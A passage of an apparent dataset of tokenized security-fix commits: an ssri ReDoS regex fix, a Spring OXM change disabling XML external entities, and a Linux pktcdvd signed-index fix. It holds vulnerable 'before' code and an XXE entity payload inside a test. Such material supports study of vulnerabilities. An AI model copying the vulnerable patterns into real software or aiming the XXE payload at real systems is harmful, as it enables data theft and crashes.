"racing", "__ksm_exit", "*", "of", "the", "last", "mm", "on", "the", "list", "may", "have", "removed", "it", "since", "then", ".", "*", "/", "if", "(", "slot", "=", "=", "&", "ksm_mm_head", ")", "return", "NULL", ";</s>"], "docstring_tokens": ["which", "may", "result", "in", "a", "denial-of-service", "condition", "."]}
{"contents": ["fix(security):", "tweak", "strict", "SRI", "regex", "(#10)", "The", "previous", "form", "was", "vulnerable", "to", "ReDoS", "attacks,", "by", "crafting", "exceptionally", "long", "base64", "hash", "strings.", "This", "issue", "only", "affected", "consumers", "using", "the", "opts.strict", "option."], "code_tokens": ["const", "STRICT_SRI_REGEX", "=", "/", "^(", "[^", "-]", "+)", "-(", "[", "A", "-", "Za", "-", "z0", "-", "9", "+", "/=", "]{", "44", ",", "88", "}", ")(", "\\?", "[\\", "x21", "-", "\\", "x7E", "]", "*)", "*$", "/", "const", "sri", "=", "ssri", ".", "parse", "(", "'", "sha1", "-", "eUN", "/", "Xt2hP5wGabl43XqQZt0gWfE", "=", "sha256", "-", "Qhx213Vjr6GRSEawEL0WTzlb00whAuXpngy5zxc8HYc", "=", "')", "'", "sha1", "-", "eUN", "/", "Xt2hP5wGabl43XqQZt0gWfE", "=", "sha256", "-", "Qhx213Vjr6GRSEawEL0WTzlb00whAuXpngy5zxc8HYc", "=", "',", "'", "sha256", "-", "Qhx213Vjr6GRSEawEL0WTzlb00whAuXpngy5zxc8HYc", "=", "',", "'", "sha1", "-", "eUN", "/", "Xt2hP5wGabl43XqQZt0gWfE", "=", "\\", "nsha256", "-", "Qhx213Vjr6GRSEawEL0WTzlb00whAuXpngy5zxc8HYc", "=", "',", "const", "strictSri", "=", "ssri", ".", "parse", "(", "'", "sha512", "-", "WrLorGiX4iEWOOOaJSiCrmDIamA47exH", "+", "Bz7tVwIPb4sCU8w4iNqGCqYuspMMeU5pgz", "/", "sU7koP5u8W3RCUojGw", "=", "='", ")", "strictSri", ".", "concat", "(", "'", "sha1", "-", "eUN", "/", "Xt2hP5wGabl43XqQZt0gWfE", "=", "',", "{", "strict", ":", "true", "}", ").", "toString", "(", "),", "'", "sha512", "-", "WrLorGiX4iEWOOOaJSiCrmDIamA47exH", "+", "Bz7tVwIPb4sCU8w4iNqGCqYuspMMeU5pgz", "/", "sU7koP5u8W3RCUojGw", "=", "='", ",", "ssri", ".", "stringify", "(", "'", "sha512", "-", "WrLorGiX4iEWOOOaJSiCrmDIamA47exH", "+", "Bz7tVwIPb4sCU8w4iNqGCqYuspMMeU5pgz", "/", "sU7koP5u8W3RCUojGw", "=", "=", "sha256", "-", "Qhx213Vjr6GRSEawEL0WTzlb00whAuXpngy5zxc8HYc", "=", "',", "{", "sep", ":", "'", "\\", "r", "|", "\\", "n", "\\", "t", "'", ",", "strict", ":", "true", "}", "),", "'", "sha512", "-", "WrLorGiX4iEWOOOaJSiCrmDIamA47exH", "+", "Bz7tVwIPb4sCU8w4iNqGCqYuspMMeU5pgz", "/", "sU7koP5u8W3RCUojGw", "=", "=", "\\", "r", "\\", "n", "\\", "tsha256", "-", "Qhx213Vjr6GRSEawEL0WTzlb00whAuXpngy5zxc8HYc", "=", "',</s>const", "STRICT_SRI_REGEX", "=", "/", "^(", "[^", "-]", "+)", "-(", "[", "A", "-", "Za", "-", "z0", "-", "9", "+", "/]", "+(", "?:", "=?", "=?", "))", "([", "?\\", "x21", "-", "\\", "x7E", "]", "*)", "$/", "const", "sri", "=", "ssri", ".", "parse", "(", "'", "sha512", "-", "foo", "sha256", "-", "bar", "!", "')", "'", "sha512", "-", "foo", "sha256", "-", "bar", "!", "',", "'", "sha512", "-", "foo", "'", ",", "'", "sha512", "-", "foo", "\\", "nsha256", "-", "bar", "!", "',", "sri", ".", "concat", "(", "'", "sha1", "-", "bar", "!", "',", "{", "strict", ":", "true", "}", ").", "toString", "(", "),", "'", "sha512", "-", "foo", "'", ",", "ssri", ".", "stringify", "(", "'", "sha512", "-", "foo", "sha256", "-", "bar", "'", ",", "{", "sep", ":", "'", "\\", "r", "|", "\\", "n", "\\", "t", "'", ",", "strict", ":", "true", "}", "),", "'", "sha512", "-", "foo", "\\", "r", "\\", "n", "\\", "tsha256", "-", "bar", "'", ","], "docstring_tokens": ["a", "regular", "expression", "denial", "of", "service"]}
{"contents": ["Add", "processExternalEntities", "support", "to", "OXM", "Update", "OXM", "AbstractMarshaller", "to", "support", "processing", "of", "external", "XML", "entities.", "By", "default", "external", "entities", "will", "not", "be", "processed.", "Issue:", "SPR-11376"], "code_tokens": ["@", "Override", "protected", "String", "getDefaultEncoding", "(", ")", "{", "return", "this", ".", "encoding", ";", "}", "/", "**", "*", "@", "return", "the", "configured", "value", "for", "whether", "XML", "external", "entities", "are", "allowed", ".", "*", "/", "public", "boolean", "isProcessExternalEntities", "(", ")", "{", "return", "this", ".", "processExternalEntities", ";", "}", "*", "Copyright", "2002", "-", "2014", "the", "original", "author", "or", "authors", ".", "import", "javax", ".", "xml", ".", "transform", ".", "OutputKeys", ";", "@", "Override", "protected", "String", "getDefaultEncoding", "(", ")", "{", "return", "this", ".", "encoding", ";", "}", "\"", "Could", "not", "transform", "to", "[", "\"", "+", "ClassUtils", ".", "getShortName", "(", "result", ".", "getClass", "(", "))", "+", "\"", "]\"", ",", "ex", ")", ";", "return", "transformAndUnmarshal", "(", "new", "DOMSource", "(", "node", ")", ",", "null", ")", ";", "return", "transformAndUnmarshal", "(", "new", "SAXSource", "(", "xmlReader", ",", "inputSource", ")", ",", "inputSource", ".", "getEncoding", "(", "))", ";", "private", "Object", "transformAndUnmarshal", "(", "Source", "source", ",", "String", "encoding", ")", "throws", "IOException", "{", "if", "(", "encoding", "!", "=", "null", ")", "{", "transformer", ".", "setOutputProperty", "(", "OutputKeys", ".", "ENCODING", ",", "encoding", ")", ";", "}", "\"", "Could", "not", "transform", "from", "[", "\"", "+", "ClassUtils", ".", "getShortName", "(", "source", ".", "getClass", "(", "))", "+", "\"", "]\"", ",", "ex", ")", ";", "*", "Copyright", "2002", "-", "2014", "the", "original", "author", "or", "authors", ".", "private", "boolean", "processExternalEntities", "=", "false", ";", "/", "**", "*", "Indicates", "whether", "external", "XML", "entities", "are", "processed", "when", "unmarshalling", ".", "*", "<", "p", ">", "Default", "is", "{", "@", "code", "false", "}", ",", "meaning", "that", "external", "entities", "are", "not", "resolved", ".", "*", "Note", "that", "processing", "of", "external", "entities", "will", "only", "be", "enabled", "/", "disabled", "when", "the", "*", "{", "@", "code", "Source", "}", "passed", "to", "{", "@", "link", "#", "unmarshal", "(", "Source", ")", "}", "is", "a", "{", "@", "link", "SAXSource", "}", "or", "*", "{", "@", "link", "StreamSource", "}", ".", "It", "has", "no", "effect", "for", "{", "@", "link", "DOMSource", "}", "or", "{", "@", "link", "StAXSource", "}", "*", "instances", ".", "*", "/", "public", "void", "setProcessExternalEntities", "(", "boolean", "processExternalEntities", ")", "{", "this", ".", "processExternalEntities", "=", "processExternalEntities", ";", "}", "/", "**", "*", "@", "return", "the", "configured", "value", "for", "whether", "XML", "external", "entities", "are", "allowed", ".", "*", "/", "public", "boolean", "isProcessExternalEntities", "(", ")", "{", "return", "this", ".", "processExternalEntities", ";", "}", "/", "**", "*", "@", "return", "the", "default", "encoding", "to", "use", "for", "marshalling", "or", "unmarshalling", "from", "*", "a", "byte", "stream", ",", "or", "{", "@", "code", "null", "}", ".", "*", "/", "abstract", "protected", "String", "getDefaultEncoding", "(", ");", "return", "unmarshalStreamSourceNoExternalEntitities", "(", "(", "StreamSource", ")", "source", ")", ";", "XMLReader", "xmlReader", "=", "XMLReaderFactory", ".", "createXMLReader", "(", ");", "xmlReader", ".", "setFeature", "(", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "general", "-", "entities", "\"", ",", "isProcessExternalEntities", "(", "))", ";", "return", "xmlReader", ";", "/", "**", "*", "Template", "method", "for", "handling", "{", "@", "code", "StreamSource", "}", "s", "with", "protection", "against", "*", "the", "XML", "External", "Entity", "(", "XXE", ")", "processing", "vulnerability", "taking", "into", "account", "*", "the", "value", "of", "the", "{", "@", "link", "#", "setProcessExternalEntities", "(", "boolean", ")", "}", "property", ".", "*", "<", "p", ">", "*", "The", "default", "implementation", "wraps", "the", "StreamSource", "as", "a", "SAXSource", "and", "delegates", "*", "to", "{", "@", "link", "#", "unmarshalSaxSource", "(", "javax", ".", "xml", ".", "transform", ".", "sax", ".", "SAXSource", ")", "}.", "*", "*", "@", "param", "streamSource", "the", "{", "@", "code", "StreamSource", "}", "*", "@", "return", "the", "object", "graph", "*", "@", "throws", "IOException", "if", "an", "I", "/", "O", "exception", "occurs", "*", "@", "throws", "XmlMappingException", "if", "the", "given", "source", "cannot", "be", "mapped", "to", "an", "object", "*", "*", "@", "see", "<", "a", "href", "=", "\"", "https", ":", "//", "www", ".", "owasp", ".", "org", "/", "index", ".", "php", "/", "XML_External_Entity_", "(", "XXE", ")", "_Processing", "\"", ">", "XML_External_Entity_", "(", "XXE", ")", "_Processing", "<", "/", "a", ">", "*", "/", "protected", "Object", "unmarshalStreamSourceNoExternalEntitities", "(", "StreamSource", "streamSource", ")", "throws", "XmlMappingException", ",", "IOException", "{", "InputSource", "inputSource", ";", "if", "(", "streamSource", ".", "getInputStream", "(", ")", "!", "=", "null", ")", "{", "inputSource", "=", "new", "InputSource", "(", "streamSource", ".", "getInputStream", "(", "))", ";", "inputSource", ".", "setEncoding", "(", "getDefaultEncoding", "(", "))", ";", "}", "else", "if", "(", "streamSource", ".", "getReader", "(", ")", "!", "=", "null", ")", "{", "inputSource", "=", "new", "InputSource", "(", "streamSource", ".", "getReader", "(", "))", ";", "}", "else", "{", "inputSource", "=", "new", "InputSource", "(", "streamSource", ".", "getSystemId", "(", "))", ";", "}", "return", "unmarshalSaxSource", "(", "new", "SAXSource", "(", "inputSource", ")", ");", "}", "*", "<", "p", ">", "As", "of", "3", ".", "2", ".", "8", "and", "4", ".", "0", ".", "2", "this", "method", "is", "no", "longer", "invoked", "from", "*", "{", "@", "link", "#", "unmarshal", "(", "javax", ".", "xml", ".", "transform", ".", "Source", ")", "}.", "The", "method", "invoked", "instead", "is", "*", "{", "@", "link", "#", "unmarshalStreamSourceNoExternalEntitities", "(", "javax", ".", "xml", ".", "transform", ".", "stream", ".", "StreamSource", ")", "}.", "*", "*", "Copyright", "2002", "-", "2014", "the", "original", "author", "or", "authors", ".", "@", "Override", "protected", "String", "getDefaultEncoding", "(", ")", "{", "return", "null", ";", "}", "import", "javax", ".", "xml", ".", "stream", ".", "*;", "import", "javax", ".", "xml", ".", "transform", ".", "stax", ".", "StAXSource", ";", "import", "javax", ".", "xml", ".", "transform", ".", "stream", ".", "StreamSource", ";", "@", "Override", "protected", "String", "getDefaultEncoding", "(", ")", "{", "return", "this", ".", "encoding", ";", "}", "@", "Override", "protected", "Object", "unmarshalStreamSourceNoExternalEntitities", "(", "StreamSource", "streamSource", ")", "throws", "XmlMappingException", ",", "IOException", "{", "return", "super", ".", "unmarshalStreamSource", "(", "streamSource", ")", ";", "}", "*", "Copyright", "2002", "-", "2014", "the", "original", "author", "or", "authors", ".", "import", "java", ".", "util", ".", "concurrent", ".", "atomic", ".", "AtomicReference", ";", "import", "javax", ".", "xml", ".", "transform", ".", "sax", ".", "SAXSource", ";", "import", "org", ".", "xml", ".", "sax", ".", "InputSource", ";", "import", "org", ".", "xml", ".", "sax", ".", "XMLReader", ";", "import", "static", "junit", ".", "framework", ".", "Assert", ".", "assertNotNull", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "@", "Test", "public", "void", "unmarshalStreamSourceExternalEntities", "(", ")", "throws", "Exception", "{", "final", "AtomicReference", "<", "XMLReader", ">", "result", "=", "new", "AtomicReference", "<", "XMLReader", ">", "()", ";", "CastorMarshaller", "marshaller", "=", "new", "CastorMarshaller", "(", ")", "{", "@", "Override", "protected", "Object", "unmarshalSaxReader", "(", "XMLReader", "xmlReader", ",", "InputSource", "inputSource", ")", "{", "result", ".", "set", "(", "xmlReader", ")", ";", "return", "null", ";", "}", "}", ";", "/", "/", "1", ".", "external", "-", "general", "-", "entities", "disabled", "(", "default", ")", "marshaller", ".", "unmarshal", "(", "new", "StreamSource", "(", "\"", "1", "\"", "))", ";", "assertNotNull", "(", "result", ".", "get", "(", "))", ";", "assertEquals", "(", "false", ",", "result", ".", "get", "(", ").", "getFeature", "(", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "general", "-", "entities", "\"", "))", ";", "/", "/", "2", ".", "external", "-", "general", "-", "entities", "disabled", "(", "default", ")", "result", ".", "set", "(", "null", ")", ";", "marshaller", ".", "setProcessExternalEntities", "(", "true", ")", ";", "marshaller", ".", "unmarshal", "(", "new", "StreamSource", "(", "\"", "1", "\"", "))", ";", "assertNotNull", "(", "result", ".", "get", "(", "))", ";", "assertEquals", "(", "true", ",", "result", ".", "get", "(", ").", "getFeature", "(", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "general", "-", "entities", "\"", "))", ";", "}", "@", "Test", "public", "void", "unmarshalSaxSourceExternalEntities", "(", ")", "throws", "Exception", "{", "final", "AtomicReference", "<", "XMLReader", ">", "result", "=", "new", "AtomicReference", "<", "XMLReader", ">", "()", ";", "CastorMarshaller", "marshaller", "=", "new", "CastorMarshaller", "(", ")", "{", "@", "Override", "protected", "Object", "unmarshalSaxReader", "(", "XMLReader", "xmlReader", ",", "InputSource", "inputSource", ")", "{", "result", ".", "set", "(", "xmlReader", ")", ";", "return", "null", ";", "}", "}", ";", "/", "/", "1", ".", "external", "-", "general", "-", "entities", "disabled", "(", "default", ")", "marshaller", ".", "unmarshal", "(", "new", "SAXSource", "(", "new", "InputSource", "(", "\"", "1", "\"", "))", ");", "assertNotNull", "(", "result", ".", "get", "(", "))", ";", "assertEquals", "(", "false", ",", "result", ".", "get", "(", ").", "getFeature", "(", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "general", "-", "entities", "\"", "))", ";", "/", "/", "2", ".", "external", "-", "general", "-", "entities", "disabled", "(", "default", ")", "result", ".", "set", "(", "null", ")", ";", "marshaller", ".", "setProcessExternalEntities", "(", "true", ")", ";", "marshaller", ".", "unmarshal", "(", "new", "SAXSource", "(", "new", "InputSource", "(", "\"", "1", "\"", "))", ");", "assertNotNull", "(", "result", ".", "get", "(", "))", ";", "assertEquals", "(", "true", ",", "result", ".", "get", "(", ").", "getFeature", "(", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "general", "-", "entities", "\"", "))", ";", "}", "*", "Copyright", "2002", "-", "2014", "the", "original", "author", "or", "authors", ".", "import", "javax", ".", "xml", ".", "transform", ".", "sax", ".", "SAXSource", ";", "import", "javax", ".", "xml", ".", "transform", ".", "stream", ".", "StreamSource", ";", "import", "org", ".", "mockito", ".", "ArgumentCaptor", ";", "import", "org", ".", "xml", ".", "sax", ".", "*;", "marshaller", ".", "setPackagesToScan", "(", "new", "String", "[", "]{", "\"", "org", ".", "springframework", ".", "oxm", ".", "jaxb", "\"", "})", ";", "/", "/", "SPR", "-", "10806", "@", "Test", "public", "void", "unmarshalStreamSourceExternalEntities", "(", ")", "throws", "Exception", "{", "final", "javax", ".", "xml", ".", "bind", ".", "Unmarshaller", "unmarshaller", "=", "mock", "(", "javax", ".", "xml", ".", "bind", ".", "Unmarshaller", ".", "class", ")", ";", "Jaxb2Marshaller", "marshaller", "=", "new", "Jaxb2Marshaller", "(", ")", "{", "@", "Override", "protected", "javax", ".", "xml", ".", "bind", ".", "Unmarshaller", "createUnmarshaller", "(", ")", "{", "return", "unmarshaller", ";", "}", "}", ";", "/", "/", "1", ".", "external", "-", "general", "-", "entities", "disabled", "(", "default", ")", "marshaller", ".", "unmarshal", "(", "new", "StreamSource", "(", "\"", "1", "\"", "))", ";", "ArgumentCaptor", "<", "SAXSource", ">", "sourceCaptor", "=", "ArgumentCaptor", ".", "forClass", "(", "SAXSource", ".", "class", ")", ";", "verify", "(", "unmarshaller", ")", ".", "unmarshal", "(", "sourceCaptor", ".", "capture", "(", "))", ";", "SAXSource", "result", "=", "sourceCaptor", ".", "getValue", "(", ");", "assertEquals", "(", "false", ",", "result", ".", "getXMLReader", "(", ").", "getFeature", "(", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "general", "-", "entities", "\"", "))", ";", "/", "/", "2", ".", "external", "-", "general", "-", "entities", "enabled", "reset", "(", "unmarshaller", ")", ";", "marshaller", ".", "setProcessExternalEntities", "(", "true", ")", ";", "marshaller", ".", "unmarshal", "(", "new", "StreamSource", "(", "\"", "1", "\"", "))", ";", "verify", "(", "unmarshaller", ")", ".", "unmarshal", "(", "sourceCaptor", ".", "capture", "(", "))", ";", "result", "=", "sourceCaptor", ".", "getValue", "(", ");", "assertEquals", "(", "true", ",", "result", ".", "getXMLReader", "(", ").", "getFeature", "(", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "general", "-", "entities", "\"", "))", ";", "}", "/", "/", "SPR", "-", "10806", "@", "Test", "public", "void", "unmarshalSaxSourceExternalEntities", "(", ")", "throws", "Exception", "{", "final", "javax", ".", "xml", ".", "bind", ".", "Unmarshaller", "unmarshaller", "=", "mock", "(", "javax", ".", "xml", ".", "bind", ".", "Unmarshaller", ".", "class", ")", ";", "Jaxb2Marshaller", "marshaller", "=", "new", "Jaxb2Marshaller", "(", ")", "{", "@", "Override", "protected", "javax", ".", "xml", ".", "bind", ".", "Unmarshaller", "createUnmarshaller", "(", ")", "{", "return", "unmarshaller", ";", "}", "}", ";", "/", "/", "1", ".", "external", "-", "general", "-", "entities", "disabled", "(", "default", ")", "marshaller", ".", "unmarshal", "(", "new", "SAXSource", "(", "new", "InputSource", "(", "\"", "1", "\"", "))", ");", "ArgumentCaptor", "<", "SAXSource", ">", "sourceCaptor", "=", "ArgumentCaptor", ".", "forClass", "(", "SAXSource", ".", "class", ")", ";", "verify", "(", "unmarshaller", ")", ".", "unmarshal", "(", "sourceCaptor", ".", "capture", "(", "))", ";", "SAXSource", "result", "=", "sourceCaptor", ".", "getValue", "(", ");", "assertEquals", "(", "false", ",", "result", ".", "getXMLReader", "(", ").", "getFeature", "(", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "general", "-", "entities", "\"", "))", ";", "/", "/", "2", ".", "external", "-", "general", "-", "entities", "enabled", "reset", "(", "unmarshaller", ")", ";", "marshaller", ".", "setProcessExternalEntities", "(", "true", ")", ";", "marshaller", ".", "unmarshal", "(", "new", "SAXSource", "(", "new", "InputSource", "(", "\"", "1", "\"", "))", ");", "verify", "(", "unmarshaller", ")", ".", "unmarshal", "(", "sourceCaptor", ".", "capture", "(", "))", ";", "result", "=", "sourceCaptor", ".", "getValue", "(", ");", "assertEquals", "(", "true", ",", "result", ".", "getXMLReader", "(", ").", "getFeature", "(", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "general", "-", "entities", "\"", "))", ";", "}", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "util", ".", "concurrent", ".", "atomic", ".", "AtomicReference", ";", "import", "javax", ".", "xml", ".", "transform", ".", "sax", ".", "SAXSource", ";", "import", "javax", ".", "xml", ".", "transform", ".", "stream", ".", "StreamSource", ";", "import", "org", ".", "mockito", ".", "ArgumentCaptor", ";", "import", "org", ".", "springframework", ".", "oxm", ".", "XmlMappingException", ";", "import", "org", ".", "springframework", ".", "oxm", ".", "jaxb", ".", "Jaxb2Marshaller", ";", "import", "org", ".", "xml", ".", "sax", ".", "InputSource", ";", "import", "org", ".", "xml", ".", "sax", ".", "XMLReader", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "import", "static", "org", ".", "mockito", ".", "Mockito", ".", "mock", ";", "import", "static", "org", ".", "mockito", ".", "Mockito", ".", "reset", ";", "import", "static", "org", ".", "mockito", ".", "Mockito", ".", "verify", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertNotNull", ";", "*", "Copyright", "2002", "-", "2014", "the", "original", "author", "or", "authors", ".", "import", "javax", ".", "xml", ".", "transform", ".", "dom", ".", "DOMSource", ";", "import", "javax", ".", "xml", ".", "transform", ".", "sax", ".", "SAXSource", ";", "import", "javax", ".", "xml", ".", "transform", ".", "stream", ".", "StreamSource", ";", "import", "org", ".", "springframework", ".", "util", ".", "xml", ".", "StaxUtils", ";", "import", "org", ".", "xml", ".", "sax", ".", "InputSource", ";", "import", "org", ".", "xml", ".", "sax", ".", "SAXException", ";", "import", "org", ".", "xml", ".", "sax", ".", "XMLReader", ";", "import", "org", ".", "xml", ".", "sax", ".", "helpers", ".", "XMLReaderFactory", ";", "private", "boolean", "processExternalEntities", "=", "false", ";", "/", "**", "*", "Indicates", "whether", "external", "XML", "entities", "are", "processed", "when", "converting", "to", "a", "Source", ".", "*", "<", "p", ">", "Default", "is", "{", "@", "code", "false", "}", ",", "meaning", "that", "external", "entities", "are", "not", "resolved", ".", "*", "/", "public", "void", "setProcessExternalEntities", "(", "boolean", "processExternalEntities", ")", "{", "this", ".", "processExternalEntities", "=", "processExternalEntities", ";", "}", "source", "=", "processSource", "(", "source", ")", ";", "protected", "Source", "processSource", "(", "Source", "source", ")", "{", "if", "(", "source", "instanceof", "StreamSource", ")", "{", "StreamSource", "streamSource", "=", "(", "StreamSource", ")", "source", ";", "InputSource", "inputSource", "=", "new", "InputSource", "(", "streamSource", ".", "getInputStream", "(", "))", ";", "try", "{", "XMLReader", "xmlReader", "=", "XMLReaderFactory", ".", "createXMLReader", "(", ");", "String", "featureName", "=", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "general", "-", "entities", "\"", ";", "xmlReader", ".", "setFeature", "(", "featureName", ",", "this", ".", "processExternalEntities", ")", ";", "return", "new", "SAXSource", "(", "xmlReader", ",", "inputSource", ")", ";", "}", "catch", "(", "SAXException", "ex", ")", "{", "logger", ".", "warn", "(", "\"", "Processing", "of", "external", "entities", "could", "not", "be", "disabled", "\"", ",", "ex", ")", ";", "return", "source", ";", "}", "}", "else", "{", "return", "source", ";", "}", "}", "/", "**", "*", "@", "return", "the", "configured", "value", "for", "whether", "XML", "external", "entities", "are", "allowed", ".", "*", "/", "public", "boolean", "isProcessExternalEntities", "(", ")", "{", "return", "this", ".", "processExternalEntities", ";", "}", "inputFactory", ".", "setProperty", "(", "XMLInputFactory", ".", "IS_SUPPORTING_EXTERNAL_ENTITIES", ",", "this", ".", "processExternalEntities", ")", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "http", ".", "converter", ".", "HttpMessageNotReadableException", ";", "import", "org", ".", "xml", ".", "sax", ".", "SAXParseException", ";", "@", "Test", "public", "void", "readXmlRootElementExternalEntityDisabled", "(", ")", "throws", "Exception", "{", "Resource", "external", "=", "new", "ClassPathResource", "(", "\"", "external", ".", "txt", "\"", ",", "getClass", "(", "))", ";", "String", "content", "=", "\"", "<!", "DOCTYPE", "root", "[", "\"", "\"", "<", "!", "ELEMENT", "external", "ANY", ">", "\\", "n", "\"", "\"", "<", "!", "ENTITY", "ext", "SYSTEM", "\\", "\"\"", "+", "external", ".", "getURI", "(", ")", "+", "\"", "\\\"", ">", "]>", "\"", "\"", "<", "rootElement", ">", "<", "external", ">", "&", "ext", ";", "</", "external", ">", "</", "rootElement", ">", "\";", "MockHttpInputMessage", "inputMessage", "=", "new", "MockHttpInputMessage", "(", "content", ".", "getBytes", "(", "\"", "UTF", "-", "8", "\"", "))", ";", "RootElement", "rootElement", "=", "(", "RootElement", ")", "converter", ".", "read", "(", "RootElement", ".", "class", ",", "inputMessage", ")", ";", "assertEquals", "(", "\"\"", ",", "rootElement", ".", "external", ")", ";", "}", "@", "Test", "public", "void", "readXmlRootElementExternalEntityEnabled", "(", ")", "throws", "Exception", "{", "Resource", "external", "=", "new", "ClassPathResource", "(", "\"", "external", ".", "txt", "\"", ",", "getClass", "(", "))", ";", "String", "content", "=", "\"", "<!", "DOCTYPE", "root", "[", "\"", "\"", "<", "!", "ELEMENT", "external", "ANY", ">", "\\", "n", "\"", "\"", "<", "!", "ENTITY", "ext", "SYSTEM", "\\", "\"\"", "+", "external", ".", "getURI", "(", ")", "+", "\"", "\\\"", ">", "]>", "\"", "\"", "<", "rootElement", ">", "<", "external", ">", "&", "ext", ";", "</", "external", ">", "</", "rootElement", ">", "\";", "MockHttpInputMessage", "inputMessage", "=", "new", "MockHttpInputMessage", "(", "content", ".", "getBytes", "(", "\"", "UTF", "-", "8", "\"", "))", ";", "this", ".", "converter", ".", "setProcessExternalEntities", "(", "true", ")", ";", "RootElement", "rootElement", "=", "(", "RootElement", ")", "converter", ".", "read", "(", "RootElement", ".", "class", ",", "inputMessage", ")", ";", "assertEquals", "(", "\"", "Foo", "Bar", "\"", ",", "rootElement", ".", "external", ")", ";", "}", "@", "XmlElement", "(", "required", "=", "false", ")", "public", "String", "external", ";</s>*", "Copyright", "2002", "-", "2013", "the", "original", "author", "or", "authors", ".", "\"", "Could", "not", "transform", "to", "[", "\"", "+", "ClassUtils", ".", "getShortName", "(", "result", ".", "getClass", "(", "))", "+", "\"", "]\"", ");", "return", "transformAndUnmarshal", "(", "new", "DOMSource", "(", "node", ")", ");", "return", "transformAndUnmarshal", "(", "new", "SAXSource", "(", "xmlReader", ",", "inputSource", ")", ");", "private", "Object", "transformAndUnmarshal", "(", "Source", "source", ")", "throws", "IOException", "{", "\"", "Could", "not", "transform", "from", "[", "\"", "+", "ClassUtils", ".", "getShortName", "(", "source", ".", "getClass", "(", "))", "+", "\"", "]\"", ");", "*", "Copyright", "2002", "-", "2013", "the", "original", "author", "or", "authors", ".", "return", "unmarshalStreamSource", "(", "(", "StreamSource", ")", "source", ")", ";", "return", "XMLReaderFactory", ".", "createXMLReader", "(", ");", "*", "Copyright", "2002", "-", "2012", "the", "original", "author", "or", "authors", ".", "import", "javax", ".", "xml", ".", "stream", ".", "XMLEventReader", ";", "import", "javax", ".", "xml", ".", "stream", ".", "XMLEventWriter", ";", "import", "javax", ".", "xml", ".", "stream", ".", "XMLStreamException", ";", "import", "javax", ".", "xml", ".", "stream", ".", "XMLStreamReader", ";", "import", "javax", ".", "xml", ".", "stream", ".", "XMLStreamWriter", ";", "*", "Copyright", "2002", "-", "2013", "the", "original", "author", "or", "authors", ".", "*", "Copyright", "2002", "-", "2013", "the", "original", "author", "or", "authors", ".", "import", "org", ".", "xml", ".", "sax", ".", "Attributes", ";", "import", "org", ".", "xml", ".", "sax", ".", "ContentHandler", ";", "import", "org", ".", "xml", ".", "sax", ".", "Locator", ";", "marshaller", ".", "setPackagesToScan", "(", "new", "String", "[", "]", "{", "\"", "org", ".", "springframework", ".", "oxm", ".", "jaxb", "\"", "}", ");", "import", "static", "org", ".", "junit", ".", "Assert", ".", "*;", "*", "Copyright", "2002", "-", "2010", "the", "original", "author", "or", "authors", ".", "inputFactory", ".", "setProperty", "(", "\"", "javax", ".", "xml", ".", "stream", ".", "isSupportingExternalEntities", "\"", ",", "this", ".", "processExternalEntities", ")", ";"], "docstring_tokens": ["obtain", "sensitive", "information"]}
{"contents": ["Fix", "pktcdvd", "ioctl", "dev_minor", "range", "check", "The", "PKT_CTRL_CMD_STATUS", "device", "ioctl", "retrieves", "a", "pointer", "to", "a", "pktcdvd_device", "from", "the", "global", "pkt_devs", "array.", "The", "index", "into", "this", "array", "is", "provided", "directly", "by", "the", "user", "and", "is", "a", "signed", "integer,", "so", "the", "comparison", "to", "ensure", "that", "it", "falls", "within", "the", "bounds", "of", "this", "array", "will", "fail", "when", "provided", "with", "a", "negative", "index.", "This", "can", "be", "used", "to", "read", "arbitrary", "kernel", "memory", "or", "cause", "a", "crash", "due", "to", "an", "invalid", "pointer", "dereference.", "This", "can", "be", "exploited", "by", "users", "with", "permission", "to", "open", "/dev/pktcdvd/control", "(on", "many", "distributions,", "this", "is", "readable", "by", "group", "\"cdrom\").", "Signed-off-by:", "Dan", "Rosenberg", "<dan.j.rosenberg@gmail.com>", "[", "Rather", "than", "add", "a", "cast,", "just", "make", "the", "function", "take", "the", "right", "type", "-Linus", "]", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["static", "struct", "pktcdvd_device", "*", "pkt_find_dev_from_minor", "(", "unsigned", "int", "dev_minor", ")</s>static", "struct", "pktcdvd_device", "*", "pkt_find_dev_from_minor", "(", "int", "dev_minor", ")"], "docstring_tokens": ["read", "arbitrary", "kernel", "memory", "or", "cause", "the", "system", "to", "crash"]}
